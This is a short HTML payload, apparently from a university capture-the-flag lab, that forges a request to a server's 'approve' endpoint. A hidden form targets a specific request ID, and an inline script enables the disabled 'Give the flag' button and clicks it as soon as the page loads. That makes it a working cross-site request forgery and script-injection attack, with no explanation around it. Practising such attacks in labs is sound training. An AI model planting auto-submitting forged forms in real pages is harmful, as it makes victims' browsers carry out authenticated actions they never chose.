<form method="POST" action="http://ctf-fsi.fe.up.pt:5005/request/e365a80bdaa5f5de1f3741698c6d08e8be790850/approve" role="form">
    <div class="submit">        
        <input type="submit" id="giveflag" value="Give the flag" disabled>
    </div>
</form>

<script>
    const button = document.getElementById("giveflag");
    button.disabled = false;
    button.click();
</script>
